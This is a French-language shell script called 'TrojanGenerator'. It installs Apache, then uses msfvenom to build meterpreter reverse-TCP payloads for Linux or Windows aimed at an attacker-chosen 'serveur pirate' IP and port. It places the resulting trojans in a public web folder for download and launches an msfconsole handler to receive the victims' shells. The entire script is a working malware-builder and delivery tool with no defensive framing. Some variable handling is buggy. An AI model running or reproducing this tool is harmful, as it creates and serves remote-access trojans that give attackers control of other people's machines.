#!/bin/sh


RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
NC='\033[0m'
origIFS="${IFS}"


echo  " ${RED}███    ███  █████  ██      ██     ██  █████  ██████  ███████     ████████ ██████   ██████       ██  █████  ███    ██" 
echo  " ${RED}████  ████ ██   ██ ██      ██     ██ ██   ██ ██   ██ ██             ██    ██   ██ ██    ██      ██ ██   ██ ████   ██ "
echo  " ${RED}██ ████ ██ ███████ ██      ██  █  ██ ███████ ██████  █████          ██    ██████  ██    ██      ██ ███████ ██ ██  ██ "
echo  " ${RED}██  ██  ██ ██   ██ ██      ██ ███ ██ ██   ██ ██   ██ ██             ██    ██   ██ ██    ██ ██   ██ ██   ██ ██  ██ ██ "
echo  " ${RED}██      ██ ██   ██ ███████  ███ ███  ██   ██ ██   ██ ███████        ██    ██   ██  ██████   █████  ██   ██ ██   ████\n" 
                                                                                                                     
                                 

echo "\n"
                                                                                                                       
                                                                                                                        
echo "${YELLOW}#################################"                                                                                                                       
echo "${GREEN}Bienvenue sur TrojanGenerator : "
echo "${YELLOW}#################################\n" 

sleep 2 



echo "${NC} Avez-vous un serveur Apache ? [Y/N] "

	read SrvApache
SrvApache=$(echo $SrvApache | tr '[:upper:]' '[:lower:]')


if [ "$SrvApache" = "no"  ] || [ "$SrvApache" = "n" ] || [ "$SrvApache" = "non" ] ;
then

apt update -y 

apt -y install apache2

mkdir -p /var/www/html/share

systemctl restart apache2

echo "\n"

elif [ "$SrvApache" = "yes"  ] || [ "$SrvApache" = "y" ] || [ "$SrvApache" = "oui" ] || [ "$SrvApache" = "o" ]
then 
	echo "${GREEN}Vous possedez un serveur Apache opérationnel  "
	echo " Nous pouvons procéder a la suite \n "
	systemctl start apache2

else : 
	echo "${RED}error le programme a crash :( "
	exit 1
fi 	


echo "${NC} Avez-vous un Malware exécutable  ? [Y/N] "

	read execute
SrvApache=$(echo $execute | tr '[:upper:]' '[:lower:]')


if [ "$execute" = "no"  ] || [ "$execute" = "n" ] || [ "$execute" = "non" ] ;
then


echo "${NC}veuillez choisir  l'OS de la cible : "

echo "1 Linux\n"

echo "2 Windows"

read choix 

if [ "$choix" = 1  ]  ;
then 
echo "veuillez  renseigner le nom du Malware :  ${GREEN}(name.elf) "
read name 
chemin=$(echo $PWD)
sleep 4 
 echo "${NC}Veuillez choisir l'adresse ip de votre serveur pirate : \n"
 read IP
 echo "Veuillez choisir le port d'écoute souhaité : \n"
 
 read port
 

msfvenom -p linux/x86/meterpreter/reverse_tcp  LHOST=$IP LPORT=$port -f elf  > $chemin/$name

	cp $name /var/www/html/share/


 echo "Voulez vous lancer cette derniére via msfconsole ? [Y/N]  "
 
   read msf 
	msf=$(echo $msf | tr '[:upper:]' '[:lower:]')


if [ "$msf" = "no"  ] || [ "$msf" = "n" ] || [ "$msf" = "non" ] ;
then

echo "${GREEN} La team HacherWood vous remercie pour votre collaboration  vous pouvez utiliser l'utilitaire Armitage pour éxécuté votre programme "

exit 0 

elif [ "$msf" = "yes"  ] || [ "$msf" = "y" ] || [ "$msf" = "oui" ] || [ "$msf" = "o" ]
then


gnome-terminal -- msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $port; run" 
fi







elif [ "$choix" = 2  ]  ;
then
echo "veuillez  renseigner le nom du malware : ${GREEN}(name.exe)"
read name 
chemin=$(echo $PWD)
sleep 4 
 echo "${NC}Veuillez choisir l'adresse ip de votre serveur pirate : \n"
 read IP
 echo "Veuillez choisir le port d'ecoute souhaité : \n"
 
 read port
 
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$port -f exe > $chemin/$name

 mv $name /var/www/html/share
 
 
 
 echo "Voulez vous lancer cette derniére via msfconsole ? [Y/N]  "
 
   read msf 
	msf=$(echo $msf | tr '[:upper:]' '[:lower:]')


if [ "$msf" = "no"  ] || [ "$msf" = "n" ] || [ "$msf" = "non" ] ;
then

echo "${GREEN} La team HackerWood vous remercie pour votre collaboration  vous pouvez utiliser l'utilitaire Armitage pour éxécuté votre programme "

exit 0 

elif [ "$msf" = "yes"  ] || [ "$msf" = "y" ] || [ "$msf" = "oui" ] || [ "$msf" = "o" ]
then

	gnome-terminal -- msfconsole -x "use exploit/multi/handler; set payload /windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $port; run"  
fi
 
 
 
 
 
 fi
 
 elif [ "$execute" = "yes"  ] || [ "$execute" = "y" ] || [ "$execute" = "oui" ] || [ "$execute" = "o" ]
 then 
 
 echo "${GREEN} Trés bien nous allons procéder a la suite :\n "
 echo "${NC} possédez vous un malware pour Linux ? [Y/N] "
 
 read Linux 
	Linux=$(echo $Linux | tr '[:upper:]' '[:lower:]')
  fi
 

if [ "$Linux" = "yes"  ] || [ "$Linux" = "y" ] || [ "$Linux" = "oui" ] || [ "$Linux" = "o" ] ;
then 
 
  echo "Voulez vous lancer cette derniére via msfconsole ? [Y/N]  "
 
   read msf 
	msf=$(echo $msf | tr '[:upper:]' '[:lower:]')


if [ "$msf" = "no"  ] || [ "$msf" = "n" ] || [ "$msf" = "non" ] ;
then

echo "${GREEN} La team HacherWood vous remercie pour votre collaboration  vous pouvez utiliser l'utilitaire Armitage pour éxécuté votre programme "

exit 0 

elif [ "$msf" = "yes"  ] || [ "$msf" = "y" ] || [ "$msf" = "oui" ] || [ "$msf" = "o" ]
then
	echo "veuillez reneigner l'ip de votre machine pirate : "
		read IP 
		
	echo "veuillez renseigner le port de votre malware  "
		read port
	gnome-terminal -- msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $port; run" 
fi


elif [ "$Linux" = "no"  ] || [ "$Linux" = "n" ] || [ "$Linux" = "non" ] ;
then
	echo "${GREEN}Trés bien nous allons passez a la suite : "
	sleep 2 
	echo "${NC}veuillez reneigner l'ip de votre machine pirate : "
		read IP 
		
	echo "veuillez renseigner le port de votre malware  "
		read port
	
gnome-terminal -- msfconsole -x "use exploit/multi/handler; set payload /windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT $port; run" 
	



else : 
	
	echo "${GREEN}Fin du programme "
	
	exit 1

fi 	
 

exit 0 


#fi 
